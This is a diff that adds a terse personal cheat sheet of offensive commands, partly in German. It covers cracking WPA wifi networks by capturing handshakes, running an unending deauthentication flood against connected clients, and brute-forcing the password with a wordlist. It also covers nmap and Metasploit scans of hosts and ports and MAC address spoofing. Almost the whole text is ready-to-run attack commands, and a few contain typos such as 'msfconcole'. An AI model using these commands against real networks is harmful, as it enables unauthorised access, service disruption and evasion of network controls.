@@ -1,0 +1,60 @@
+# Wifi in monitoring modus & reverse
+
+sudo ip link set dev [device] down
+sudo iwconfig [device] mode monitor
+sudo ip link set dev [device] up
+
+(airmon-ng stop [device])
+sudo iwconfig [device] mode managed
+sudo systemctl restart NetworkManager
+
+
+# crack wifi
+
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0
+- get ESSID & channel
+
+1. sudo airodump-ng -w [file] -c [channel] --bssid [bssid] wlan0
+2. sudo aireplay-ng --deauth 0 -a [bssid] -c [MAC von Station device] wlan0
+
+- check the .cap file:
+wireshark [file.cap]
+filter for EAPOL
+
+sudo airmon-ng stop wlan0
+sudo aircrack-ng [file.cap] -w /usr/share/wordlists/rockyou.txt
+
+# NMap
+
+scan network:
+nmap [ip]/[ports] -sn
+(ip route/ip addr/ip a)
+
+
+scan the ip for ports:
+nmap [ip] -Pn -sV
+
+
+# nmap/Metasploit vuln:
+
+nmap -v -A [ip]
+msfconcole
+use /auxiliary/scanner/portscan/tcp
+show options
+set RHOSTS [ip]
+(set PORTS [port,port,..])
+(set THREADS 3)
+run
+db_nmap -sV -p [port,port,...] [ip]
+db_nmap -sV -A -p [port,port,...] [ip]
+
+# mac spoofing
+
+macchanger -s [device]
+ifconfig [device] down
+macchanger -r [device]
+ifconfig [device] up
+
+macchanger -m [mac]
